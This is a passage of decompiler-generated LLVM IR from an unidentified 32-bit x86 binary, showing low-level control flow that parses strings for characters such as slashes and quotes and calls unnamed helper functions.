  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  %v3_80499b0 = load i32, i32* %v2_80499b0, align 4
  %v2_80499b7 = add i32 %v3_80499b0, %v4_80499ab
  store i32 %v2_80499b7, i32* %edx.global-to-local, align 4
  store i32 %v2_80499b7, i32* %v2_80499b0, align 4
  %v0_80499c0 = load i32, i32* @esp, align 4
  %v1_80499c0 = add i32 %v0_80499c0, 16
  %v6_80499c0 = icmp eq i32 %v1_80499c0, 0
  store i1 %v6_80499c0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_804994e, %dec_label_pc_8049982
  %v1_8049ef8 = phi i32 [ %v1_804997c, %dec_label_pc_804994e ], [ %v1_80499c0, %dec_label_pc_8049982 ]
  %v1_80499c3 = add i32 %v1_8049ef8, 20900
  %v2_80499c3 = inttoptr i32 %v1_80499c3 to i32*
  %v3_80499c3 = load i32, i32* %v2_80499c3, align 4
  store i32 %v3_80499c3, i32* %eax.global-to-local, align 4
  %v0_80499ca = load i32, i32* @esi, align 4
  %v2_80499ca = add i32 %v0_80499ca, %v3_80499c3
  %v3_80499ca = inttoptr i32 %v2_80499ca to i8*
  %v4_80499ca = load i8, i8* %v3_80499ca, align 1
  %v13_80499ca = icmp eq i8 %v4_80499ca, 34
  store i1 %v13_80499ca, i1* %zf.global-to-local, align 1
  br i1 %v13_80499ca, label %dec_label_pc_8049ef5, label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %dec_label_pc_8049ef5, %dec_label_pc_80499c3, %dec_label_pc_8049f19
  %v1_80499d4 = phi i32 [ %v1_8049f0b, %dec_label_pc_8049ef5 ], [ %v1_8049ef8, %dec_label_pc_80499c3 ], [ %v1_80499d4.pre, %dec_label_pc_8049f19 ]
  %v0_80499d4 = phi i32 [ %v2_8049f06, %dec_label_pc_8049ef5 ], [ %v3_80499c3, %dec_label_pc_80499c3 ], [ %v0_80499d4.pre, %dec_label_pc_8049f19 ]
  %v2_80499d4 = add i32 %v1_80499d4, -4
  %v3_80499d4 = inttoptr i32 %v2_80499d4 to i32*
  store i32 %v0_80499d4, i32* %v3_80499d4, align 4
  %v0_80499d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499d4, -8
  %v3_80499d5 = inttoptr i32 %v2_80499d5 to i32*
  store i32 %v0_80499d5, i32* %v3_80499d5, align 4
  %v1_80499d6 = add i32 %v1_80499d4, -12
  %v2_80499d6 = inttoptr i32 %v1_80499d6 to i32*
  store i32 10, i32* %v2_80499d6, align 4
  %v0_80499d8 = load i32, i32* @esi, align 4
  %v2_80499d8 = add i32 %v1_80499d4, -16
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v0_80499d8, i32* %v3_80499d8, align 4
  %v3_80499d9 = call i32 @function_8051da0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  %v0_80499de = load i32, i32* @esp, align 4
  %v1_80499de = add i32 %v0_80499de, 16
  store i32 %v3_80499d9, i32* %edx.global-to-local, align 4
  %v1_80499e3 = add i32 %v3_80499d9, -1
  store i32 %v1_80499e3, i32* %eax.global-to-local, align 4
  %v9_80499e6 = icmp eq i32 %v3_80499d9, 9
  store i1 %v9_80499e6, i1* %zf.global-to-local, align 1
  %v6_80499e9 = icmp ugt i32 %v1_80499e3, 8
  br i1 %v6_80499e9, label %dec_label_pc_8049a11, label %dec_label_pc_80499eb

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499d4
  %v1_80499eb = add i32 %v0_80499de, 132
  %v2_80499eb = inttoptr i32 %v1_80499eb to i32*
  %v3_80499eb = load i32, i32* %v2_80499eb, align 4
  %v2_80499ef = add i32 %v3_80499eb, %v3_80499d9
  store i32 %v2_80499ef, i32* @ebx, align 4
  %v9_8049a00185 = icmp eq i32 %v1_80499de, 12
  store i1 %v9_8049a00185, i1* %zf.global-to-local, align 1
  %v2_8049a03187 = inttoptr i32 %v0_80499de to i32*
  store i32 0, i32* %v2_8049a03187, align 4
  %v2_8049a05188 = call i32 @function_8052502(i32* %v1_80484ea)
  store i32 %v2_8049a05188, i32* %eax.global-to-local, align 4
  %v0_8049a0a189 = load i32, i32* @esp, align 4
  %v1_8049a0a190 = add i32 %v0_8049a0a189, 16
  %v1_8049a0d191 = load i32, i32* @ebx, align 4
  %v7_8049a0d192 = icmp ult i32 %v2_8049a05188, %v1_8049a0d191
  %v12_8049a0d193 = icmp eq i32 %v2_8049a05188, %v1_8049a0d191
  store i1 %v12_8049a0d193, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d192, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3
  %v0_8049a0a194 = phi i32 [ %v0_8049a0a, %dec_label_pc_80499f3 ], [ %v0_8049a0a189, %dec_label_pc_80499eb ]
  %v9_80499f3 = icmp eq i32 %v0_8049a0a194, -4
  store i1 %v9_80499f3, i1* %zf.global-to-local, align 1
  %v2_80499f6 = inttoptr i32 %v0_8049a0a194 to i32*
  store i32 1, i32* %v2_80499f6, align 4
  %v1_80499f8 = call i32 @function_8053df0(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80499f8, i32* %eax.global-to-local, align 4
  %v0_80499fd = load i32, i32* @esp, align 4
  %v9_8049a00 = icmp eq i32 %v0_80499fd, -4
  store i1 %v9_8049a00, i1* %zf.global-to-local, align 1
  %v2_8049a03 = inttoptr i32 %v0_80499fd to i32*
  store i32 0, i32* %v2_8049a03, align 4
  %v2_8049a05 = call i32 @function_8052502(i32* %v1_80484ea)
  store i32 %v2_8049a05, i32* %eax.global-to-local, align 4
  %v0_8049a0a = load i32, i32* @esp, align 4
  %v1_8049a0a = add i32 %v0_8049a0a, 16
  %v1_8049a0d = load i32, i32* @ebx, align 4
  %v7_8049a0d = icmp ult i32 %v2_8049a05, %v1_8049a0d
  %v12_8049a0d = icmp eq i32 %v2_8049a05, %v1_8049a0d
  store i1 %v12_8049a0d, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3, %dec_label_pc_80499d4
  %v0_8049a1a = phi i32 [ %v1_80499de, %dec_label_pc_80499d4 ], [ %v1_8049a0a190, %dec_label_pc_80499eb ], [ %v1_8049a0a, %dec_label_pc_80499f3 ]
  %v1_8049a11 = add i32 %v0_8049a1a, 20900
  %v2_8049a11 = inttoptr i32 %v1_8049a11 to i32*
  %v3_8049a11 = load i32, i32* %v2_8049a11, align 4
  store i32 %v3_8049a11, i32* %eax.global-to-local, align 4
  %v0_8049a18 = load i32, i32* @esi, align 4
  %v2_8049a1d = add i32 %v0_8049a18, %v3_8049a11
  %v12_8049a1d = icmp eq i32 %v2_8049a1d, 0
  store i1 %v12_8049a1d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049a1d, i32* @ebx, align 4
  %v2_8049a1f = add i32 %v0_8049a1a, -16
  %v3_8049a1f = inttoptr i32 %v2_8049a1f to i32*
  store i32 %v2_8049a1d, i32* %v3_8049a1f, align 4
  %v2_8049a20 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049a20, i32* %eax.global-to-local, align 4
  %v0_8049a25 = load i32, i32* @esp, align 4
  %v9_8049a25 = icmp eq i32 %v0_8049a25, -12
  store i1 %v9_8049a25, i1* %zf.global-to-local, align 1
  %v1_8049a28 = add i32 %v0_8049a25, 8
  %v2_8049a28 = inttoptr i32 %v1_8049a28 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b6b.15 to i32), i32* %v2_8049a28, align 4
  %v2_8049a2d = add i32 %v0_8049a25, 4
  %v3_8049a2d = inttoptr i32 %v2_8049a2d to i32*
  store i32 %v2_8049a20, i32* %v3_8049a2d, align 4
  %v0_8049a2e = load i32, i32* @ebx, align 4
  %v3_8049a2e = inttoptr i32 %v0_8049a25 to i32*
  store i32 %v0_8049a2e, i32* %v3_8049a2e, align 4
  %v4_8049a2f = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esp, align 4
  %v1_8049a34 = add i32 %v0_8049a34, 16
  %v9_8049a37 = icmp eq i32 %v4_8049a2f, 4
  store i1 %v9_8049a37, i1* %zf.global-to-local, align 1
  br i1 %v9_8049a37, label %dec_label_pc_8049e6a, label %dec_label_pc_8049a40

dec_label_pc_8049a40:                             ; preds = %dec_label_pc_8049a11
  %v0_8049a40 = load i32, i32* @ebx, align 4
  %v1_8049a40 = inttoptr i32 %v0_8049a40 to i8*
  %v2_8049a40 = load i8, i8* %v1_8049a40, align 1
  %v11_8049a40 = icmp eq i8 %v2_8049a40, 47
  store i1 %v11_8049a40, i1* %zf.global-to-local, align 1
  br i1 %v11_8049a40, label %dec_label_pc_8049d1e, label %dec_label_pc_8049a49

dec_label_pc_8049a49:                             ; preds = %dec_label_pc_8049d41, %dec_label_pc_8049d1e, %dec_label_pc_8049a40, %dec_label_pc_8049d76
  %v0_8049a49 = phi i32 [ %v1_8049d6b, %dec_label_pc_8049d41 ], [ %v1_8049d33, %dec_label_pc_8049d1e ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d8b, %dec_label_pc_8049d76 ]
  %v1_8049a49 = add i32 %v0_8049a49, 76
  %v2_8049a49 = inttoptr i32 %v1_8049a49 to i32*
  %v3_8049a49 = load i32, i32* %v2_8049a49, align 4
  store i32 %v3_8049a49, i32* %edx.global-to-local, align 4
  %v1_8049a4d = add i32 %v3_8049a49, 1431
  %v2_8049a4d = inttoptr i32 %v1_8049a4d to i32*
  store i32 5522759, i32* %v2_8049a4d, align 4
  %v0_8049a57 = load i32, i32* @esp, align 4
  %v1_8049a57 = add i32 %v0_8049a57, 92
  %v2_8049a57 = inttoptr i32 %v1_8049a57 to i32*
  %v3_8049a57 = load i32, i32* %v2_8049a57, align 4
  store i32 %v3_8049a57, i32* %ecx.global-to-local, align 4
  %v1_8049a5b = add i32 %v3_8049a57, -1448
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i8*
  store i8 10, i8* %v2_8049a5b, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049124
  %v1_8049a67 = add i32 %v0_8049145, 108
  %v2_8049a67 = inttoptr i32 %v1_8049a67 to i32*
  %v3_8049a67 = load i32, i32* %v2_8049a67, align 4
  store i32 %v3_8049a67, i32* %eax.global-to-local, align 4
  %v1_8049a6b = add i32 %v3_8049a67, 12
  %v2_8049a6b = inttoptr i32 %v1_8049a6b to i32*
  store i32 0, i32* %v2_8049a6b, align 4
  br label %dec_label_pc_80491db

dec_label_pc_8049a77:                             ; preds = %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, %dec_label_pc_804987f, %dec_label_pc_8049854
  %v0_8049a77 = phi i32 [ %v0_8049a77.pre, %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge ], [ %v1_80498d4, %dec_label_pc_804987f ], [ %v1_8049875, %dec_label_pc_8049854 ]
  %v1_8049a77 = add i32 %v0_8049a77, -4
  %v2_8049a77 = inttoptr i32 %v1_8049a77 to i32*
  store i32 4, i32* %v2_8049a77, align 4
  %v1_8049a79 = add i32 %v0_8049a77, -8
  %v2_8049a79 = inttoptr i32 %v1_8049a79 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b64.13 to i32), i32* %v2_8049a79, align 4
  %v1_8049a7e = add i32 %v0_8049a77, 104
  %v2_8049a7e = inttoptr i32 %v1_8049a7e to i32*
  %v3_8049a7e = load i32, i32* %v2_8049a7e, align 4
  store i32 %v3_8049a7e, i32* %ecx.global-to-local, align 4
  %v2_8049a82 = add i32 %v0_8049a77, -12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v3_8049a7e, i32* %v3_8049a82, align 4
  %v1_8049a83 = add i32 %v0_8049a77, 131
  store i32 %v1_8049a83, i32* %eax.global-to-local, align 4
  %v2_8049a8a = add i32 %v0_8049a77, -16
  %v3_8049a8a = inttoptr i32 %v2_8049a8a to i32*
  store i32 %v1_8049a83, i32* %v3_8049a8a, align 4
  %v0_8049a8b = call i32 @function_8051d50()
  store i32 %v0_8049a8b, i32* %eax.global-to-local, align 4
  %v0_8049a90 = load i32, i32* @esp, align 4
  %v1_8049a90 = add i32 %v0_8049a90, 92
  %v2_8049a90 = inttoptr i32 %v1_8049a90 to i32*
  %v3_8049a90 = load i32, i32* %v2_8049a90, align 4
  store i32 %v0_8049a8b, i32* @esi, align 4
  %v1_8049a96 = add i32 %v3_8049a90, 1431
  %v9_8049a96 = icmp eq i32 %v1_8049a96, 0
  store i1 %v9_8049a96, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a96, i32* @ebx, align 4
  %v1_8049a9c = inttoptr i32 %v0_8049a90 to i32*
  %v2_8049a9c = load i32, i32* %v1_8049a9c, align 4
  store i32 %v2_8049a9c, i32* %eax.global-to-local, align 4
  %v3_8049a9c = add i32 %v0_8049a90, 4
  %v1_8049a9d = inttoptr i32 %v3_8049a9c to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  store i32 %v2_8049a9d, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8054b75.18 to i32), i32* %v1_8049a9d, align 4
  %v0_8049aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8049aa3, i32* %v1_8049a9c, align 4
  %v0_8049aa4 = call i32 @function_8052010()
  store i32 %v0_8049aa4, i32* %eax.global-to-local, align 4
  %v0_8049aa9 = load i32, i32* @esp, align 4
  %v3_8049aac = trunc i32 %v0_8049aa4 to i8
  %v4_8049aac = icmp eq i8 %v3_8049aac, 0
  store i1 %v4_8049aac, i1* %zf.global-to-local, align 1
  br i1 %v4_8049aac, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049a77
  %v0_8049ab4.in = phi i32 [ %v0_8049c5b, %dec_label_pc_8049c4e ], [ %v0_8049aa9, %dec_label_pc_8049a77 ]
  %v1_8049ab4 = add i32 %v0_8049ab4.in, 108
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  store i32 %v3_8049ab4, i32* %edx.global-to-local, align 4
  %v1_8049ab8 = add i32 %v3_8049ab4, -1448
  %v2_8049ab8 = inttoptr i32 %v1_8049ab8 to i8*
  store i8 7, i8* %v2_8049ab8, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049c66, %dec_label_pc_8049ab4
  %v0_8049abf = load i32, i32* @esp, align 4
  %v1_8049abf = add i32 %v0_8049abf, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 16384, i32* %v2_8049abf, align 4
  %v0_8049ac4 = load i32, i32* @esi, align 4
  %v2_8049ac4 = add i32 %v0_8049abf, -8
  %v3_8049ac4 = inttoptr i32 %v2_8049ac4 to i32*
  store i32 %v0_8049ac4, i32* %v3_8049ac4, align 4
  %v1_8049ac5 = add i32 %v0_8049abf, 131
  store i32 %v1_8049ac5, i32* %eax.global-to-local, align 4
  %v2_8049acc = add i32 %v0_8049abf, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v1_8049ac5, i32* %v3_8049acc, align 4
  %v1_8049acd = add i32 %v0_8049abf, 92
  %v2_8049acd = inttoptr i32 %v1_8049acd to i32*
  %v3_8049acd = load i32, i32* %v2_8049acd, align 4
  store i32 %v3_8049acd, i32* %edx.global-to-local, align 4
  %v1_8049ad1 = add i32 %v3_8049acd, -1452
  %v2_8049ad1 = inttoptr i32 %v1_8049ad1 to i32*
  %v3_8049ad1 = load i32, i32* %v2_8049ad1, align 4
  store i32 %v3_8049ad1, i32* %eax.global-to-local, align 4
  %v2_8049ad7 = add i32 %v0_8049abf, -16
  %v3_8049ad7 = inttoptr i32 %v2_8049ad7 to i32*
  store i32 %v3_8049ad1, i32* %v3_8049ad7, align 4
  %v0_8049ad8 = call i32 @function_805290e()
  store i32 %v0_8049ad8, i32* %eax.global-to-local, align 4
  %v0_8049add = load i32, i32* @esp, align 4
  %v6_8049add = icmp eq i32 %v0_8049add, -16
  store i1 %v6_8049add, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8048ebe
  %v3_8049ae5 = load i32, i32* %v2_8049ae5, align 4
  %v4_8049ae5 = add i32 %v3_8049ae5, -10239
  %v9_8049ae5 = sub i32 10238, %v3_8049ae5
  %v10_8049ae5 = and i32 %v9_8049ae5, %v3_8049ae5
  %v11_8049ae5 = icmp slt i32 %v10_8049ae5, 0
  %v12_8049ae5 = icmp eq i32 %v4_8049ae5, 0
  store i1 %v12_8049ae5, i1* %zf.global-to-local, align 1
  %v13_8049ae5 = icmp slt i32 %v4_8049ae5, 0
  %v3_8049aed = icmp ne i1 %v13_8049ae5, %v11_8049ae5
  %v4_8049aed = or i1 %v12_8049ae5, %v3_8049aed
  br i1 %v4_8049aed, label %dec_label_pc_8048d91, label %dec_label_pc_8048ee1

dec_label_pc_8049af8:                             ; preds = %dec_label_pc_8049577
  %v0_8049af8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049af8 = add i32 %v0_8049af8, -1448
  %v2_8049af8 = inttoptr i32 %v1_8049af8 to i8*
  store i8 1, i8* %v2_8049af8, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049b04:                             ; preds = %dec_label_pc_80497ba
  %v0_8049b04 = load i32, i32* @ebx, align 4
  %v1_8049b04 = inttoptr i32 %v0_8049b04 to i32*
  store i32 104, i32* %v1_8049b04, align 4
  %v0_80497f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80497f9

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049518
  %v0_8049b0f = load i32, i32* @edi, align 4
  %v1_8049b0f = inttoptr i32 %v0_8049b0f to i32*
  %v2_8049b0f = load i32, i32* %v1_8049b0f, align 4
  %v11_8049b0f = icmp eq i32 %v2_8049b0f, 11
  store i1 %v11_8049b0f, i1* %zf.global-to-local, align 1
  %v1_8049b12 = icmp eq i1 %v11_8049b0f, false
  br i1 %v1_8049b12, label %dec_label_pc_8048e4a, label %dec_label_pc_8048d91

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049468
  %v1_8049b1d = add i32 %v0_804948a, 20916
  %v2_8049b1d = inttoptr i32 %v1_8049b1d to i32*
  store i32 7, i32* %v2_8049b1d, align 4
  %v0_8049b28 = load i32, i32* @esi, align 4
  %v1_8049b28 = add i32 %v0_8049b28, 4
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i8*
  %v3_8049b28 = load i8, i8* %v2_8049b28, align 1
  %v12_8049b28 = icmp eq i8 %v3_8049b28, 115
  store i1 %v12_8049b28, i1* %zf.global-to-local, align 1
  br i1 %v12_8049b28, label %dec_label_pc_8049d93, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b1d, %dec_label_pc_8049d93
  %v0_8049b32 = load i32, i32* @esp, align 4
  %v1_8049b32 = add i32 %v0_8049b32, 20900
  %v2_8049b32 = inttoptr i32 %v1_8049b32 to i32*
  %v3_8049b32 = load i32, i32* %v2_8049b32, align 4
  store i32 %v3_8049b32, i32* %eax.global-to-local, align 4
  %v0_8049b39 = load i32, i32* @edx, align 4
  %v2_8049b39 = add i32 %v0_8049b32, -4
  %v3_8049b39 = inttoptr i32 %v2_8049b39 to i32*
  store i32 %v0_8049b39, i32* %v3_8049b39, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  %v1_8049b3a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b3a = sub i32 %v0_8049b3a, %v1_8049b3a
  %v12_8049b3a = icmp eq i32 %v2_8049b3a, 0
  store i1 %v12_8049b3a, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b3a, i32* @ebx, align 4
  %v0_8049b3c = load i32, i32* @esi, align 4
  %v2_8049b3c = add i32 %v0_8049b3c, %v1_8049b3a
  store i32 %v2_8049b3c, i32* %eax.global-to-local, align 4
  %v2_8049b3f = add i32 %v0_8049b32, -8
  %v3_8049b3f = inttoptr i32 %v2_8049b3f to i32*
  store i32 %v2_8049b3a, i32* %v3_8049b3f, align 4
  %v0_8049b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b40 = add i32 %v0_8049b32, -12
  %v3_8049b40 = inttoptr i32 %v2_8049b40 to i32*
  store i32 %v0_8049b40, i32* %v3_8049b40, align 4
  %v0_8049b41 = load i32, i32* @esi, align 4
  %v2_8049b41 = add i32 %v0_8049b32, -16
  %v3_8049b41 = inttoptr i32 %v2_8049b41 to i32*
  store i32 %v0_8049b41, i32* %v3_8049b41, align 4
  %v4_8049b42 = call i32 @function_80527a3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b42, i32* %eax.global-to-local, align 4
  %v0_8049b47 = load i32, i32* @esp, align 4
  %v1_8049b47 = add i32 %v0_8049b47, 20916
  %v2_8049b47 = inttoptr i32 %v1_8049b47 to i32*
  store i32 0, i32* %v2_8049b47, align 4
  %v0_8049b52 = load i32, i32* @esi, align 4
  %v1_8049b52 = inttoptr i32 %v0_8049b52 to i8*
  %v2_8049b52 = load i8, i8* %v1_8049b52, align 1
  %v3_8049b52 = zext i8 %v2_8049b52 to i32
  %v5_8049b52 = and i32 %v4_8049b42, -256
  %v6_8049b52 = or i32 %v3_8049b52, %v5_8049b52
  store i32 %v6_8049b52, i32* %eax.global-to-local, align 4
  %v0_8049b54 = load i32, i32* @esp, align 4
  %v4_8049b57 = icmp eq i8 %v2_8049b52, 0
  store i1 %v4_8049b57, i1* %zf.global-to-local, align 1
  br i1 %v4_8049b57, label %dec_label_pc_8049b86, label %dec_label_pc_8049b5b

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v0_8049b52, i32* %ecx.global-to-local, align 4
  %v10_8049b5d = icmp eq i8 %v2_8049b52, 47
  store i1 %v10_8049b5d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b5d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b65

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b5b
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049b76171 = add i32 %v0_8049b52, 1
  store i32 %v2_8049b76171, i32* %ecx.global-to-local, align 4
  %v2_8049b79172 = add i32 %v0_8049b54, 20916
  %v3_8049b79173 = inttoptr i32 %v2_8049b79172 to i32*
  store i32 1, i32* %v3_8049b79173, align 4
  %v0_8049b80174 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80175 = inttoptr i32 %v0_8049b80174 to i8*
  %v2_8049b80176 = load i8, i8* %v1_8049b80175, align 1
  %v3_8049b80177 = zext i8 %v2_8049b80176 to i32
  %v4_8049b80178 = load i32, i32* @edx, align 4
  %v5_8049b80179 = and i32 %v4_8049b80178, -256
  %v6_8049b80180 = or i32 %v5_8049b80179, %v3_8049b80177
  store i32 %v6_8049b80180, i32* %edx.global-to-local, align 4
  %v4_8049b82181 = icmp eq i8 %v2_8049b80176, 0
  store i1 %v4_8049b82181, i1* %zf.global-to-local, align 1
  %v1_8049b84182 = icmp eq i1 %v4_8049b82181, false
  br i1 %v1_8049b84182, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge
  %v2_8049b80184 = phi i8 [ %v2_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v2_8049b80176, %dec_label_pc_8049b65 ]
  %v0_8049b80183 = phi i32 [ %v0_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v0_8049b80174, %dec_label_pc_8049b65 ]
  %v0_8049b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b6c = add i32 %v0_8049b6c, 1
  store i32 %v1_8049b6c, i32* %eax.global-to-local, align 4
  %v10_8049b6d = icmp eq i8 %v2_8049b80184, 47
  store i1 %v10_8049b6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b6d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge

dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge: ; preds = %dec_label_pc_8049b6c
  %v1_8049b76.pre = load i32, i32* @esi, align 4
  %v1_8049b79.pre = load i32, i32* @esp, align 4
  %v2_8049b76 = add i32 %v1_8049b6c, %v1_8049b76.pre
  store i32 %v2_8049b76, i32* %ecx.global-to-local, align 4
  %v2_8049b79 = add i32 %v1_8049b79.pre, 20900
  %v3_8049b79 = inttoptr i32 %v2_8049b79 to i32*
  store i32 %v1_8049b6c, i32* %v3_8049b79, align 4
  %v0_8049b80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80 = inttoptr i32 %v0_8049b80 to i8*
  %v2_8049b80 = load i8, i8* %v1_8049b80, align 1
  %v3_8049b80 = zext i8 %v2_8049b80 to i32
  %v4_8049b80 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049b80 = and i32 %v4_8049b80, -256
  %v6_8049b80 = or i32 %v5_8049b80, %v3_8049b80
  store i32 %v6_8049b80, i32* %edx.global-to-local, align 4
  %v4_8049b82 = icmp eq i8 %v2_8049b80, 0
  store i1 %v4_8049b82, i1* %zf.global-to-local, align 1
  %v1_8049b84 = icmp eq i1 %v4_8049b82, false
  br i1 %v1_8049b84, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b86:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge, %dec_label_pc_8049b32, %dec_label_pc_8049c80
  %v0_8049b86 = load i32, i32* @esp, align 4
  %v9_8049b86 = icmp eq i32 %v0_8049b86, 12
  store i1 %v9_8049b86, i1* %zf.global-to-local, align 1
  %v0_8049b89 = load i32, i32* @esi, align 4
  %v2_8049b89 = add i32 %v0_8049b86, -16
  %v3_8049b89 = inttoptr i32 %v2_8049b89 to i32*
  store i32 %v0_8049b89, i32* %v3_8049b89, align 4
  %v2_8049b8a = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049b8a, i32* %eax.global-to-local, align 4
  %v0_8049b8f = load i32, i32* @esp, align 4
  %v1_8049b8f = add i32 %v0_8049b8f, 16
  %v1_8049b92 = icmp eq i32 %v2_8049b8a, 0
  store i1 %v1_8049b92, i1* %zf.global-to-local, align 1
  %tmp147 = icmp slt i32 %v2_8049b8a, 1
  br i1 %tmp147, label %dec_label_pc_8049bbc, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b86
  %v9_8049b96 = icmp eq i32 %v0_8049b8f, -4
  store i1 %v9_8049b96, i1* %zf.global-to-local, align 1
  %v0_8049b99 = load i32, i32* @esi, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b8f to i32*
  store i32 %v0_8049b99, i32* %v3_8049b99, align 4
  %v2_8049b9a = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049b9a, i32* %eax.global-to-local, align 4
  %v0_8049b9f = load i32, i32* @esp, align 4
  %v1_8049b9f = add i32 %v0_8049b9f, 16
  %v1_8049ba2 = add i32 %v2_8049b9a, -127
  %v6_8049ba2 = sub i32 126, %v2_8049b9a
  %v7_8049ba2 = and i32 %v6_8049ba2, %v2_8049b9a
  %v8_8049ba2 = icmp slt i32 %v7_8049ba2, 0
  %v9_8049ba2 = icmp eq i32 %v1_8049ba2, 0
  store i1 %v9_8049ba2, i1* %zf.global-to-local, align 1
  %v10_8049ba2 = icmp slt i32 %v1_8049ba2, 0
  %v3_8049ba5 = icmp eq i1 %v10_8049ba2, %v8_8049ba2
  %v4_8049ba5 = icmp eq i1 %v9_8049ba2, false
  %v5_8049ba5 = and i1 %v4_8049ba5, %v3_8049ba5
  br i1 %v5_8049ba5, label %dec_label_pc_8049bbc, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b96
  %v2_8049ba7 = add i32 %v0_8049b9f, 12
  %v3_8049ba7 = inttoptr i32 %v2_8049ba7 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba7, align 4
  %v2_8049ba8 = add i32 %v0_8049b9f, 8
  %v3_8049ba8 = inttoptr i32 %v2_8049ba8 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba8, align 4
  %v0_8049ba9 = load i32, i32* @esi, align 4
  %v2_8049ba9 = add i32 %v0_8049b9f, 4
  %v3_8049ba9 = inttoptr i32 %v2_8049ba9 to i32*
  store i32 %v0_8049ba9, i32* %v3_8049ba9, align 4
  %v1_8049baa = add i32 %v0_8049b9f, 92
  %v2_8049baa = inttoptr i32 %v1_8049baa to i32*
  %v3_8049baa = load i32, i32* %v2_8049baa, align 4
  %v1_8049bae = add i32 %v3_8049baa, 789
  %v9_8049bae = icmp eq i32 %v1_8049bae, 0
  store i1 %v9_8049bae, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bae, i32* %eax.global-to-local, align 4
